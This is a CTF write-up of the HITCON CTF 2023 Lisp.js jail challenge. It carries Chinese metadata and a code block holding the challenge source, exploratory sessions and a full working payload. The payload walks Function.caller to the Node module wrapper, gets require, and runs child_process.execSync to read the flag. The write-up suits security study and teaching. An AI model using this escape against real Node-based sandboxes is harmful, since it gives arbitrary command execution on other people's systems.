---
title: HITCON CTF 2023 Quals writeup
contest: HITCON CTF 2023 Quals
year: 2023
difficulty: hard
vuln_type: web_unknown
tags:
- node.js
- lisp.js
- jailbreak
- prototype-pollution
- child_process
- execsync
- caller
- arguments
attack_chain:
- Node.js 20-alpine + pwn.red/jail
- Lisp.js v0.1.0 自定义语言
- --disallow-code-generation-from-strings
- --disable-proto=delete (防 __proto__ 删除)
- '攻击: (let f (fun (x) (. f "caller"))) 反射'
- 递归caller七次拿module wrapper
- 拿require参数+module.children[0].exports.extendedScope
- extendedScope内置Object/Array/String+额外js互操作
- 调用require("child_process").execSync("./readflag")
- 'flag: hitcon{it_is_actually_a_node.js_jail_in_disguise!!}'
key_payload: 7次 .caller拿module wrapper → require("child_process").execSync
one_liner: HITCON CTF 2023 Lisp.js jail：递归caller 7次拿到module→execSync读flag
lesson: Function.caller + 递归拿Node.js module wrapper是Node jail经典逃逸
quality: high
full_path: HITCON_CTF_2023_Quals_writeup.full.md
meta_path: HITCON_CTF_2023_Quals_writeup.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: HITCON CTF 2023 Quals writeup。HITCON CTF 2023 Lisp.js jail：递归caller 7次拿到module→execSync读flag。关键路径：Node.js 20-alpine + pwn.red/jail → Lisp.js v0.1.0 自定义语言 → --disallow-code-generation-from-strings。经...
category: web
subcategory: web_other
tools_used:
- pwntools
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/135316.html
reasoning_chain:
- 触发点：node 20-alpine + --disallow-code-generation-from-strings + --disable-proto=delete + pwn.red/jail → 假设：传统 eval/Function 已封死，只能在 Lisp.js 自定义语言内拼字符串
- 动作：看 lisp.js 暴露的 extendedScope，发现里面有 Object/Array/String + 基本 . 取属性算子 → 观察：JS Function 对象可被 (. f "caller") 反射
- 假设：递归调用 f.caller 7 层 → 动作：lisp 代码 (let f (fun (x) (. (. f "caller") "arguments"))) → 观察：泄漏 arguments 数组
- 下一步：函数 arguments[0] 是外层 ast 节点，其中 module wrapper 通过 caller chain 第 7 层达到 → 动作：取 caller.arguments[0].callee.caller 递归 7 次
- 观察：拿到 require 参数 + module.children[0].exports.extendedScope 内的 Object/Array/String → 下一步：调 (. String "fromCharCode") 拼命令字符串
- 动作：构造 ("require") + ("child_process") + ("execSync") 路径 → 观察：成功调 execSync("./readflag") 拿到 hitcon{..it_is_actually_a_node.js_jail_in_disguise..}
failed_attempts:
- 试图用 eval("require('child_process').execSync(...)") → 失败：--disallow-code-generation-from-strings 直接抛 EvalError
- 试图用 Object.assign/Reflect.getPrototypeOf 绕 proto 链 → 失败：--disable-proto=delete 阻止 __proto__ 删除
key_observations:
- Function.prototype.caller 是 Node.js jail 的最后后门，配合 arguments.callee 反射可绕过 string eval 禁用
- Node 模块 wrapper 的第 7 层 .caller 是 module 对象内部结构，需精准递归次数
- extendedScope 暴露的 Object/Array/String 类 + . 属性访问算子是 Lisp.js 等自定义沙箱的标配
- --disallow-code-generation-from-strings + --disable-proto=delete 是现代 Node.js jail 的标准防御，必须全部突破
prerequisites:
- Node.js V8 isolate 模块 wrapper 内部结构（caller chain / module wrapper / require 参数）
- Function.prototype.caller / arguments.callee 等老式反射 API
- pwn.red/jail nsjail 容器逃逸基础
- Lisp.js / 自定义 AST 解释器沙箱结构
---
# HITCON CTF 2023 Quals writeup

> 原文: https://www.ctfiot.com/135316.html
> ID: 135316


```
FROM node:20-alpine AS app

WORKDIR /app
COPY src/ .

FROM pwn.red/jail
COPY --from=app / /srv
COPY ./src/run.sh /srv/app/run
COPY ./readflag /srv/app/readflag
RUN chmod 111 /srv/app/readflag
ENV JAIL_MEM=64M JAIL_PIDS=20 JAIL_TMP_SIZE=1M
#!/bin/sh
export PATH="$PATH:/usr/local/bin"
tmpfile="$(mktemp /tmp/lisp-input.XXXXXX)"
echo "Welcome to Lisp.js v0.1.0!"
echo "Input your Lisp code below and I will run it."
while true; do
 printf "> "
 read -r line
 if [ "$line" = "" ]; then
 break
 fi
 echo "$line" >> "$tmpfile"
done
node --disallow-code-generation-from-strings --disable-proto=delete main.js "$tmpfile"
rm "$tmpfile"
$ docker run --rm -it node:20-alpine --disallow-code-generation-from-strings -e 'eval("123")'
[eval]:1
eval("123")
^

EvalError: Code generation from strings disallowed for this context
 at [eval]:1:1
 at Script.runInThisContext (node:vm:
122:12)
 at Object.runInThisContext (node:vm:
298:38)
 at node:
internal/process/execution:83:21
 at [eval]-wrapper:6:24
 at runScript (node:
internal/process/execution:82:62)
 at evalScript (node:
internal/process/execution:
104:10)
 at node:
internal/main/eval_string:50:3

Node.js v20.6.1
const { lispEval } = require('./runtime')
const fs = require('fs')

const code = fs.readFileSync(process.argv[2], 'utf-8')
console.log(lispEval(code))
const { Tokenizer } = require('./tokenizer')
const { Parser, LispSymbol } = require('./parser')

class LispRuntimeError extends Error {
 constructor(message) {
 super(message)
 this.name = 'LispRuntimeError'
 }
}
exports.LispRuntimeError = LispRuntimeError
class Scope {
 constructor(parent) {
 this.parent = parent
 this.table = Object.create(null)
 }
 get(name) {
 if (Object.prototype.hasOwnProperty.call(this.table, name)) {
 return this.table[name]
 } else if (this.parent) {
 return this.parent.get(name)
 }
 }
 set(name, value) {
 this.table[name] = value
 }
}
exports.Scope = Scope
function astToExpr(ast) {
 if (typeof ast === 'number') {
 return function _numberexpr() {
 return ast
 }
 } else if (typeof ast === 'string') {
 return function _stringexpr() {
 return ast
 }
 } else if (ast instanceof LispSymbol) {
 return function _symbolexpr(scope) {
 // pass null to get the symbol itself
 if (scope === null) return ast
 const r = scope.get(ast.name)
 if (typeof r === 'undefined') throw new LispRuntimeError(`Undefined symbol: ${ast.name}`)
 return r
 }
 } else if (Array.isArray(ast)) {
 return function _sexpr(scope) {
 // pass null to get the ast function call itself
 if (scope === null) return ast
 const fn = astToExpr(ast[0])(scope)
 if (typeof fn !== 'function') throw new LispRuntimeError(`Unable to call a non-function: ${fn}`)
 return fn(ast.slice(1).map(astToExpr), scope)
 }
 } else {
 throw new LispRuntimeError(`Unxpexted ast: ${ast}`)
 }
}
exports.astToExpr = astToExpr
function basicScope() {
 // we always use named function here for a better stack trace
 // otherwise you would see a lot of <anonymous> in the stack trace :(
 const scope = new Scope()
 scope.set('do', function _do(args, scope) {
 const newScope = new Scope(scope)
 let ret = null
 for (const e of args) {
 ret = e(newScope)
 newScope.set('_', ret)
 }
 return ret
 })
 scope.set('print', function _print(args, scope) {
 console.log(...args.map(e => e(scope)))
 })
 // (省略)
 scope.set('.', function _dot(name, scope) {
 const obj = name[0](scope)
 const prop = name[1](scope)
 const ret = obj[prop]
 if (typeof ret === 'undefined') {
 throw new LispRuntimeError(`Undefined property: ${prop}`)
 }
 return ret
 })
 // (省略)
 scope.set('slice', function _slice(args, scope) {
 if (args.length !== 3) throw new LispRuntimeError('slice expects 3 arguments')
 const list = args[0](scope)
 const start = args[1](scope)
 const end = args[2](scope)
 if (!Array.isArray(list)) throw new LispRuntimeError('slice expects a list as first argument')
 return list.slice(start, end)
 })
 scope.set('object', function _object(args, scope) {
 return Object.fromEntries(args.map(e => e(scope)))
 })
 scope.set('keys', function _keys(args, scope) {
 const obj = args[0](scope)
 return Object.keys(obj)
 })
 return scope
}
exports.basicScope = basicScope
function extendedScope() {
 // a runtime with all the basic functions, plus some more js interop functions
 const scope = basicScope()
 scope.set('Object', Object)
 scope.set('Array', Array)
 scope.set('String', String)
 // (省略)
}
exports.extendedScope = extendedScope
function lispEval(code, scope = basicScope()) {
 const tokens = Tokenizer.tokenize(code)
 const ast = Parser.parse(tokens)
 return astToExpr(ast)(scope)
}
exports.lispEval = lispEval

if (require.main === module) {
 // (省略。サンプルコード*2)
}
$ nc localhost 1337
Welcome to Lisp.js v0.1.0!
Input your Lisp code below and I will run it.
> (do
 (let f (fun (x) (. f "caller")))
 (print (f 1)))> >
>
[Function: _sexpr]
undefined
$ nc localhost 1337
Welcome to Lisp.js v0.1.0!
Input your Lisp code below and I will run it.
> (do
 (let f (fun (x) (. (. f "caller") "arguments")))
 (print > (f 1)))>
>
[Arguments] {
 '0': Scope {
 parent: Scope { parent: undefined, table: [Object: null prototype] },
 table: [Object: null prototype] {
 f: [Function: _runtimeDefinedFunction],
 _: undefined
 }
 }
}
undefined
$ nc localhost 1337
Welcome to Lisp.js v0.1.0!
Input your Lisp code below and I will run it.
> (do
 (let x (fun ()
 (. (. (. (. (. (. (. x "caller") "caller") "caller") "caller") "caller") "caller") "caller")))
 (let res (x))
 (list res (+ "" res))
 )> > > > >
>
[
 [Function (anonymous)],
 'function (exports, require, module, __filename, __dirname) {\n' +
 "const { lispEval } = require('./runtime')\n" +
 "const fs = require('fs')\n" +
 '\n' +
 "const code = fs.readFileSync(process.argv[2], 'utf-8')\n" +
 'console.log(lispEval(code))\n' +
 '\n' +
 '}'
]
(do
 (let get_require (fun ()
 (. (. (. (. (. (. (. (. (. get_require "caller") "caller") "caller") "caller") "caller") "caller") "caller") "arguments")"1")))
 (let get_module (fun ()
 (. (. (. (. (. (. (. (. (. get_module "caller") "caller") "caller") "caller") "caller") "caller") "caller") "arguments")"2")))
 (let require (get_require))
 (let module (get_module))
 (let extendedScope (. (. (. (. module "children") "0") "exports") "extendedScope"))
 (extendedScope)
 )
scope.set('j2l', function _j2l(args, scope) {
 if (args.length !== 1) throw new LispRuntimeError('j2l expects 1 argument')
 const fn = args[0](scope)
 if (typeof fn !== 'function') throw new LispRuntimeError('j2l expects a function as argument')
 return function _wrapperForJSFunction(fnargs, callerScope) {
 return fn(...fnargs.map(e => e(callerScope)))
 }
 })
 scope.set('l2j', function _l2j(args, scope) {
 if (args.length !== 1) throw new LispRuntimeError('l2j expects 1 argument')
 const fn = args[0](scope)
 if (typeof fn !== 'function') throw new LispRuntimeError('l2j expects a function as argument')
 return function _wrapperForLispFunction(...args) {
 return fn(
 args.map(x => () => x),
 scope
 )
 }
 })
 scope.set('..', function _dot(args, scope) {
 const obj = args[0](scope)
 const prop = args[1](scope)
 let ret = obj[prop]
 if (typeof ret === 'undefined') {
 throw new LispRuntimeError(`Undefined property: ${prop}`)
 }
 if (typeof ret !== 'function') {
 throw new LispRuntimeError(`Property ${prop} is not a function`)
 }
 return Function.prototype.bind.call(ret, obj)
 })
(do
 (let get_module (fun ()
 (. (. (. (. (. (. (. (. (. get_module "caller") "caller") "caller") "caller") "caller") "caller") "caller") "arguments")"2")))
 (let module (get_module))
 (let extendedScope (. (. (. (. module "children") "0") "exports") "extendedScope"))
 (let e (extendedScope))
 (let get_require (fun ()
 (. (. (. (. (. (. (. (. get_require "caller") "caller") "caller") "caller") "caller") "caller") "caller") "arguments")))
 (let .. (. (. e "table") ".."))
 (let j2l (. (. e "table") "j2l"))
 (let require_ (get_require))
 (let require (j2l (.. require_ "1")))
 (let child_process (require "child_process"))
 (let execSync (j2l (.. child_process "execSync")))
 (+ (execSync "./readflag") ""))
$ (cat payload; echo) | nc chal-lispjs.chal.hitconctf.com 1337
Welcome to Lisp.js v0.1.0!
Input your Lisp code below and I will run it.
> > > > > > > > > > > > > > > > > hitcon{it_is_actually_a_node.js_jail_in_disguise!!}
hitcon{it_is_actually_a_node.js_jail_in_disguise!!}
```
